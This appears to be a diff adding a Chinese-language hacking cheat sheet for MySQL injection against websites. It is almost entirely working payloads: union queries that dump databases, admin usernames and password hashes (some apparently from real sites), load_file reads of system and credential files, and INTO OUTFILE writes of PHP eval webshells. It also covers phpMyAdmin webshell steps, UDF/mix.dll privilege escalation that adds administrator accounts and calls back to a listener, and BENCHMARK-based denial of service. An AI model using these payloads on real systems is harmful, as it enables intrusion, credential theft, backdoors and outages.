@@ -1,0 +1,384 @@
+一般说来mysql希望不大，很多都是不允许外连的，不过这也要试试了，用Navicat for MySQL 测试连接，输入IP
+
+//////////////////////////////////////////////////////////////////////////
+C:\WINDOWS\system32\inetsrv\MetaBase.xml的asc码。导出到本机查看得到路径网站的物理路径
+C:\WINDOWS\system32\inetsrv\History
+
+
+select '<?php eva l($_POST[cmd]);?>' into outfile 'F:/web/bak.php';
+
+读出所有库:
+http://www.xx.com/1.php?id=-1 union select 1,2,3,4,5,6,7,8,group_concat(schema_name),10,11,12,13,14,15,16,17 from information_schema.SCHEMATA
+
+读出所有表:
+http://www.xx.com/1.php?id=-1 union select 1,2,3,4,5,6,7,8,group_concat(table_name),10,11,12,13,14,15,16,17 from information_schema.tables where table_schema=database()
+
+
+
+2...------------------------------据说mysql4.1以上版本支持concat函数，
+    and 1=2 union select 1,concat(database(),0x20,version(),0x20,user()),concat(@@hostname,0x20,@@datadir),4,5,6,7,8,9,10--
+
+database()          0x77677978797765626D6973  =  wgyxywebmis 
+
+id=2%20and%201=2%20union%20select%201,hex(version()),3,4,5,6%20/*   
+成功得到hex(version())的值为：342E312E332D62657461
+
+a.  执行语句
+    and 1=2 union select 1,2,3,4,group_concat(table_name),6,7,8,9,10 from information_schema.tables where table_schema=0x77677978797765626D6973  
+    结果爆出： admin  等一些 
+    0x61646D696E  =   admin   
+
+b.  执行:
+    and 1=2 union select 1,2,3,4,group_concat(column_name),6,7,8,9,10 from
+    information_schema.columns where table_name=0x61646D696E
+    结果爆出:  username,password  等一些 
+
+c.执行:
+    and 1=2 union select 1,2,3,4,group_concat(username,0x3a,password),6,7,
+    8,9,10 from admin
+    结果爆出:
+    admincyb:c70c8578a41d82064d7b83c947e183a8,    lhx:5140bcd18a27e22e0434aa81fe05f176
+    huangke                                        xhetmzh
+
+找后台登陆之
+
+
+4.判断有没有写权限
+and (select count(*) from MySQL.user)>0-- 
+返回错误，没有写权限
+
+limit 从0开始递增，查询到3时浏览器返回错误，说明存在2个库。
+and 1=2 union select 1,SCHEMA_NAME,3,4,5,6,7,8  from information_schema.SCHEMATA limit 1,1/*
+
+
+可以把当前用户中建立数据库名全部显示出来
+and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata
+
+5.土耳其黑客的手法,查出所有数据库
+and+1=0+union+select+concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+table_schema),0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+information_schema.columns--
+成功查出所有数据库，国外的黑客就是不一般。数据库如下：
+information_schema,Advisory,IR,mad,member,mysql,twcert,vuldb,vulscandb
+
+
+1...--------------------------------------------------
+and 1=2 union select 1,2,3,4,5,6,7,8,9--
+   
+  2    3
+
+and 1=2 union select 1,concat(database(),0x20,version(),0x20,user()),concat(@@hostname,0x20,@@datadir),4,5,6,7,8,9--
+
+database()   = hype = 0x68797065
+
+and 1=2 union select 1,2,table_name,4,5,6,7,8,9 from information_schema.tables where table_schema=0x68797065 limit 1,1--
+
+admin =  0x61646D696E
+
+and 1=2 union select 1,2,column_name,4,5,6,7,8,9 from information_column.tables where table_name=0x68797065 limit 1,1--
+and 1=2 union select 1,2,column_name,4,5,6,7,8,9 from information_column.tables where table_name=0x68797065 limit 2,1--
+and 1=2 union select 1,2,column_name,4,5,6,7,8,9 from information_column.tables where table_name=0x68797065 limit 3,1--
+
+user  pass  id 
+
+and 1=2 union select 1,2,concat(user,0x20,pass),4,5,6,7,8,9 from hype.admin limit 1,1--
+and 1=2 union select 1,2,concat(user,0x20,pass),4,5,6,7,8,9 from hype.admin limit 2,1-- 
+and 1=2 union select 1,2,concat(user,0x20,pass),4,5,6,7,8,9 from hype.admin limit 3,1--
+
+
+mysql基础注入：
+
+1. 先 '  看能不能报错  爆出物理路径    /* 试试  没有报错，说明是mysql数据库
+
+2. mysql 4.0以下的版本不支持联合查询
+
+  and ord(mid(version(),1,1))>51/*   返回结果正常说明mysql版为4且大于3   正常
+      
+   /*!50000%20s*/ 报错
+   /*!60000%20s*/ 正常               说明mysql版本是大于5而小于6的
+
+3. and ord(mid(user(),1,1))=114/*    返回正常，则可以初步判断数据库为root权限
+   and (select count(*) from mysql.user)>0/* 正常，说明可以使用load_file()函数来读取文件
+ 
+4. order by 10/*   
+   and 1=2 union select 1,2,3,4,5,6,7,8,9,10/*
+
+
+
+concat(version(),0x20,database(),0x20,user())
+
+1:system_user() 系统用户名
+2:user()        用户名
+3:current_user  当前用户名
+4:session_user()连接数据库的用户名
+5:database()    数据库名
+6:version()     MYSQL数据库版本
+7:load_file()   MYSQL读取本地文件的函数
+8:@@datadir     读取数据库路径
+9:@@basedir    MYSQL 安装路径
+10:@@version_compile_os   操作系统  Windows Server 2003,
+
+1:system_user()2:user()3:current_user4:session_user()5:database()6:version()7:load_file()......他们的含义分别如下:
+
+1:系统用户名.2:用户名.3:当前用户名:4连接数据库的用户名.5:数据库名.6:数据库版本.7:MYSQL读取本地文件的函数
+
+
+2.
+
+and 0<>(select count(*) from admin)   正常  说明存在admin这张表
+
+and 0<>(select count(username) from admin)   返回正常，存在username这个字段
+and 0<>(select count(password) from admin) 
+
+常用的表名有：user/s,admin/s,member/s…
+
+常用的列名有：username,user,usr,user_name,password,pass,passwrd,passwd,pwd…
+
+高级mysql注射：
+
+
+读文件：
+
+and (select count(*) from mysql.user)>0/* 正常，说明可以使用load_file()  或者 load data infile 读取文件 函数来读取文件
+
+Substring(load_file(A),50,100)就是把 A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.
+
+转成16进制
+id=123 union select 1,2,3,load_file(0x633A5C626F6F742E696E69),5,6,7,8,9,10/*
+
+或10进制
+id=123 union select 1,2,3,
+load_file(char(99,58,92,98,111,111,116,46,105,110,105)),5,6,7,8,9,10/*
+
+
+replace(load_file(0x2F6574632F706173737764),0x3c,0x20)
+
+replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+
+上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 "<" 替换成"空格" 返回的是网页.而无法查看到代码.
+
+c:/boot.ini  =  0x633A5C626F6F742E696E69
+c:\windows\php.ini
+
+
+1. mysql.user默认的库
+
+网页的一个php页面
+读文件：
+每个文件都包含了连接数据库的文件  一直读文件直到读到密码 
+
+试试mysql是 ftp 密码  或者就是putty上去试试
+
+id=123 union select 1,2,3,hex(load_file(0x633A5C626F6F742E696E69)),5,6,7,8,9,10/*
+读到账号密码  3306连接 
+
+telnet ip port 
+
+进mysql
+mysql hwww.xxx.com u账号 p密码
+
+SHOW DATABASES;
+select version();
+
+0x203C3F706870206576616C28245F504F53545B315D293B3F3E =  <?php eval($_POST[1]);?>
+
+select  concat(0x203C3F706870206576616C28245F504F53545B315D293B3F3E) into 
+dumpfile '网站的物理路径'
+
+
+1:使用SHOW语句找出在服务器上当前存在什么数据库：
+  mysql> SHOW DATABASES;
+
+2:创建一个数据库MYSQLDATA
+  mysql> CREATE DATABASE MYSQLDATA;
+
+3:选择你所创建的数据库
+  mysql> USE MYSQLDATA; (按回车键出现Database changed 时说明操作成功！)
+
+4:查看现在的数据库中存在什么表
+  mysql> SHOW TABLES;
+
+
+
+union all select 1,concat(user,0×3a,password),3,4,5,6,7,8,9,10 from mysql.user/*
+
+
+
+1.   PHP+MYSQL数据库下快速寻找WEB站点路径？
+
+查找：WEB路径技巧：
+
+GOOGLE 输入 site:123.com warning:    通过GOOGLE 查找站点数据库出错缓存.
+网站后面加入 phpinfo.php  test.php   info.php  或者报错知道网站路径 
+
+
+Substring(load_file(A),50,100)就是把 A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.
+
+
+重点：MYSQL INTO OUTFILE下写入PHPSHELL？
+
+条件：
+1.知道物理路径(into outfile '物理路径')
+2.能够使用union (MYSQL3以上的版本)
+3.对方没有对’进行过滤
+
+and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限。
+
+
+id=123 union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*
+
+http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,char(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62),3,4,5,6 into outfile '/www/home/html/coder.php'/*
+或者
+[url]http://www.tiany6.com/coder.php?id=1[/url] and 1=2 union select 1,0x3C3F706870206576616C28245F504F53545B636D645D293F3E,3,4,5,6 into outfile '/www/home/html/coder.php'/*
+或者
+[url]http://www.tiany6.com/coder.php?id=1[/url] and 1=2 union select 1,'<?php eval($_POST[cmd])?>',3,4,5,6 into outfile '/www/home/html/coder.php'/*
+
+union+select+1,2,3,char(0x3C3F706870206576616C28245F504F53545B39305D3F3B3E),5,6,7,8,9,10,7+into+outfile+'d:\web\90team.php'--  在web目录写入一句话木马
+
+<?php+eval($_POST[90]?;>   为上面16进制编码后的一句话原型
+
+3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.
+
+还有一个办法是假如网站可以上传图片，可以将木马改成图片的格式上传，找出图片的绝对路径在通过into outfile导出为PHP文件。
+
+代码：
+id=123 union select 1,2,3,load_file(d:\web\logo123.jpg),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*
+
+id=xxx and 1=2 union select 1,2,3,unhex(mm.exe的十六进制),5 INTO DUMPFILE 'C:\\Documents and Settings\\All Users\\「开始」菜单\程序\启动\\mm.exe'/* 
+
+附：
+
+收集的一些路径：
+
+WINDOWS下:
+c:/boot.ini          //查看系统版本
+c:/windows/php.ini   //php配置信息
+c:/windows/my.ini    //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
+c:/winnt/php.ini     
+c:/winnt/my.ini
+c:\mysql\data\mysql\user.MYD  //存储了mysql.user表中的数据库连接密码
+c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini  //存储了虚拟主机网站路径和密码
+c:\Program Files\Serv-U\ServUDaemon.ini
+c:\windows\system32\inetsrv\MetaBase.xml  //IIS配置文件
+c:\windows\repair\sam  //存储了WINDOWS系统初次安装的密码
+c:\Program Files\ Serv-U\ServUAdmin.exe  //6.0版本以前的serv-u管理员密码存储于此
+c:\Program Files\RhinoSoft.com\ServUDaemon.exe
+C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件
+//存储了pcAnywhere的登陆密码
+c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf //查看     WINDOWS系统apache文件
+c:/Resin-3.0.14/conf/resin.conf   //查看jsp开发的网站 resin文件配置信息.
+c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
+d:\APACHE\Apache2\conf\httpd.conf
+C:\Program Files\mysql\my.ini
+c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
+C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
+
+
+LUNIX/UNIX下:
+
+/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
+/usr/local/apache2/conf/httpd.conf
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/usr/local/app/php5/lib/php.ini //PHP相关设置
+/etc/sysconfig/iptables //从中得到防火墙规则策略
+/etc/httpd/conf/httpd.conf // apache配置文件
+/etc/rsyncd.conf //同步程序配置文件
+/etc/my.cnf //mysql的配置文件
+/etc/redhat-release //系统版本
+/etc/issue
+/etc/issue.net
+/usr/local/app/php5/lib/php.ini //PHP相关设置
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
+/usr/local/resin-3.0.22/conf/resin.conf  针对3.0.22的RESIN配置文件查看
+/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
+/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
+/usr/local/resin-3.0.22/conf/resin.conf  针对3.0.22的RESIN配置文件查看
+/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
+/etc/sysconfig/iptables 查看防火墙策略
+
+load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
+
+replace(load_file(0x2F6574632F706173737764),0x3c,0x20)
+replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+
+上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 "<" 替换成"空格" 返回的是网页.而无法查看到代码.
+
+
+
+
+a.查库
+  id=-1 union select 1,2,SCHEMA_NAME,4,5,6,7,8,9,10
+  from+information_schema.SCHEMATA limit 1,1/*
+
+b.查表
+  id=-1+union+select+1,2,TABLE_NAME,4,5,6,7,8,9,10+from
+  +information_schema.TABLES+where+TABLE_SCHEMA=库的HEX值+limit+1,1
+
+c.查段
+  id=-1+union+select+1,COLUMN_NAME,4,5,6,7,8,9,10+from+
+  information_schema.COLUMNS+where+TABLE_NAME=表的HEX值+limit+1,1
+
+mysql5高级注入方法暴表
+
+1.爆表
+id=13240+and+1=2+union+select+1,2,TABLE_NAME,4,5+From+information_schema.TABLES+Where+TABLE_SCHEMA=0x79645F7465616D6E6574+limit+0,1/*   
+(0x79645F7465616D6E6574为数据库名的16进制转换yd_teamnet)
+
+这样爆到第4个时出现了admin_user表。
+
+2.暴字段
+id=13240+and+1=2+union+select+1,2,COLUMN_NAME,4,5+From+information_schema.COLUMNS+Where+TABLE_NAME=0x61646D696E5F75736572+And+TABLE_SCHEMA=0x79645F7465616D6E6574+limit+0,1/*
+
+3.
+3.爆密码
+id=13240+and+1=2+union+select+1,2,3,concat(0x7c,ID,0x7c,ACCOUNT,0x7c,PASSWORD,0x7c),5+From+admin_user+limit+0,1/* 
+
+
+
+
+4.phpmyadmin 后台拿webshell
+
+
+phpmyadmin爆路径方法:
+weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php
+http://url/phpmyadmin/libraries/select_lang.lib.php 
+pphpmyadmin/libraries/export/xls.php 
+hpmyadmin\themes\darkblue_orange\layout.inc.php 
+
+D:\usr\www\html\phpMyAdmin\
+----start code---
+Create TABLE a (cmd text NOT NULL);
+Insert INTO a (cmd) VALUES('<?php @eval($_POST[cmd])?>');
+select cmd from a into outfile 'D:/usr/www/html/phpMyAdmin/d.php';
+Drop TABLE IF EXISTS a;
+----end code---
+
+2:mix.dll提权
+D:/usr/www/html/mix.dll
+mysql -h 目标ip -uroot -p
+\. c:\mysql.txt
+select Mixconnect('反弹ip','端口');
+nc -vv -l -p 1983
+
+3:udf.dll提权
+create function cmdshell returns string soname 'udf.dll'
+select cmdshell('net user user password /add'); 
+select cmdshell('net localgroup administrators user /add'); 
+select cmdshell('c:\3389.exe'); 
+drop function cmdshell;  删除函数
+select cmdshell('netstat -an');
+
+
+
+
+利用BENCHMARK函数进行ddos攻击
+
+　　其实思路很简单：在BENCHMARK(count,expr) 中 我们只要设置count 就是执行次数足够大的话，就可以造成dos攻击了，如果我们用代理或其他同时提交，就是ddos攻击，估计数据库很快就会挂了。不过前提还是要求可以注射。语句：
+
+http://127.0.0.1/test/test/show.php?id=1%20union%20select%201,1,benchmark(99999999,md5(0x41))
+
+
+myadmin下
+
+select 1 from mysql.host where char(97)<benchmark(99999999,benchmark(99999999,sha1('t')))
